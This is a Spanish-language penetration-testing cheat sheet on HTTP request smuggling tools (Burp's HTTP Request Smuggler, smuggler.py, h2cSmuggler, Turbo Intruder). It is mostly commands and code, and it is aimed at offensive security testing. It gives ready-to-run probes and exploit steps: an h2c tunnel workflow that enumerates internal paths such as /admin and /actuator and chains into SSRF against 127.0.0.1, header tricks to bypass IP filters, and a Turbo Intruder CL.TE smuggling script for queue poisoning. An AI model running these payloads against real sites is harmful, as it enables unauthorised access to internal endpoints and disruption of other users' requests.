---
aliases:
  - HTTP Request Smuggler Burp
  - smuggler.py
  - h2cSmuggler
  - Turbo Intruder
tags:
  - type/cheatsheet
  - vuln/http-smuggling
  - technique/discovery
  - technique/initial-access
  - asset/web-app
primary categories: null
secondary categories: null
tertiary categories: null
type: CheatSheet
linked:
  - '[[HTTP Request Smuggling]]'
  - '[[Burp Suite]]'
---
# HTTP Request Smuggling - Tooling

***

## HTTP Request Smuggler (Burp Extension)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Instalar | Burp → Extensions → BApp Store → "HTTP Request Smuggler" | Hecha por James Kettle (PortSwigger). |
| Smuggle Probe | Right-click request → "Smuggle Probe" | Auto-detecta CL.TE, TE.CL, TE.TE, CL.CL, H2.* |
| Smuggle Attack | Right-click → "Smuggle Attack" | Crafting manual con templates. |
| HTTP/2 Probe | Sub-opción para forzar H2 | Detecta H2.CL / H2.TE / pseudo-header injection. |
| Auto-calc Content-Length | UI muestra CL correcto al editar | Evita bugs manuales. |
| Confirm vuln | Después de probe, click "Validate" → tool envía request real y mide diff | Doble check antes de exploit. |
| Tunnel feature | "Smuggle to fail open" — abre conn TCP smuggleada para múltiples requests | Sesión persistente. |
| Pipeline mode | "Send group → in single connection" del Repeater | Necesario para reproducir HRS. |
| Save findings | Tool exporta payloads en formato curl/raw | Para reportes. |
| Combinar con Turbo Intruder | Click "Send to Turbo Intruder" | Para race / volume tests. |
^hrs-tool-burp

___

## smuggler.py (defparam)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Repo | `git clone https://github.com/defparam/smuggler && cd smuggler` | CLI standalone. |
| Probe rápido | `python3 smuggler.py -u https://target/` | Test all techniques contra single URL. |
| Modo verbose | `python3 smuggler.py -u https://target/ -v v` | Logs detallados de timing. |
| Test specific technique | `python3 smuggler.py -u https://target/ -m exploit_clte` | Solo CL.TE. |
| Lista de URLs | `python3 smuggler.py -l urls.txt` | Bulk test. |
| Output payload | Genera HTTP raw que se puede mandar manual | Buena para custom exploit. |
| Modo "exploit" | `--exploit-mode` después de detection | Auto-genera prueba de concept. |
| Custom config file | `python3 smuggler.py -u url -c config.py` | Override timing/timeouts. |
| Output a archivo | `python3 smuggler.py -u url > findings.log` | Captura para reporte. |
| Threads | `-t 5` | Default 5, no exagerar (puede romper servers). |
| Timeout per probe | `--timeout 5` | Ajustar a target slow/fast. |
| Skip TLS verify | `--no-verify` | Para testing/labs. |
^hrs-tool-smuggler-py

___

## h2cSmuggler (BishopFox)

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Repo | `git clone https://github.com/BishopFox/h2csmuggler && cd h2csmuggler` | Python H2 client low-level. |
| Probe support | `python3 h2csmuggler.py -x https://target/` | Detecta si frontend acepta upgrade h2c. |
| Smuggle GET | `python3 h2csmuggler.py -x https://target/ -X GET /admin` | Acceder endpoint vía túnel h2c. |
| Smuggle POST | `python3 h2csmuggler.py -x https://target/ -X "POST /api" --post-data 'x=1'` | POST con body. |
| Custom headers | `python3 h2csmuggler.py -x https://target/ -X /admin -H "X-Forwarded-For: 127.0.0.1"` | Headers extras. |
| Bypass IP filter | Smuggle con `Host: localhost` o `X-Forwarded-For: 127.0.0.1` | Para alcanzar internal. |
| Test multi paths | Loop sobre lista de paths | Bash + script para enumeration. |
| Connection reuse | Tool mantiene conn abierta — múltiples queries por sesión | Eficiente. |
| Verbose | `-v` | Frame-level debug. |
^hrs-tool-h2csmuggler

### Workflow h2cSmuggler

```bash
# 1. Detectar
python3 h2csmuggler.py -x https://target/

# Si responde "Server is vulnerable" → continuar

# 2. Enumerar internos
for path in /admin /api/internal /actuator /debug /health; do
  python3 h2csmuggler.py -x https://target/ -X "GET $path"
done

# 3. Combinar con SSRF interno
python3 h2csmuggler.py -x https://target/ \
  -X "GET /api/proxy?url=http://127.0.0.1:8080/admin"
```

___

## Turbo Intruder Scripts

| **Comando** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| Instalar | Burp → Extensions → "Turbo Intruder" (BApp Store) | Necesario para race conditions y HRS heavy. |
| Single connection mode | `engine=Engine.BURP, pipeline=False` en script | Required para HRS (todos los requests en misma TCP conn). |
| Race + smuggle combo | Loop con delay corto + payloads smuggle | Para vectors timing-sensitive. |
| Script template smuggle | Usar templates de PortSwigger labs | https://github.com/PortSwigger/turbo-intruder/tree/master/resources/examples |
| Custom CL calc | Script Python calcula CL automáticamente | Variable `body` y bytes count. |
| Ataques de queue poisoning | Mandar smuggle + N requests legit + medir cuál respuesta llega a quién | Volumen necesario. |
| Output a file | `engine.queue(req)` + capture responses | Para análisis post. |
| Concurrencia | `engine=Engine.BURP, concurrentConnections=1` | Single-conn vs multi-conn según test. |
| Script ejemplo CL.TE | Disponible en repo PortSwigger | Punto de partida estable. |
^hrs-tool-turbo

### Script Turbo Intruder ejemplo (CL.TE smuggle queue)

```python
def queueRequests(target, wordlists):
    engine = RequestEngine(endpoint=target.endpoint,
                           concurrentConnections=1,
                           requestsPerConnection=100,
                           pipeline=False)

    smuggle = '''POST / HTTP/1.1
Host: target.com
Content-Length: 35
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X: x'''

    engine.queue(smuggle)
    for i in range(10):
        engine.queue(target.req)

def handleResponse(req, interesting):
    if 'admin' in req.response or req.status != 200:
        table.add(req)
```

***
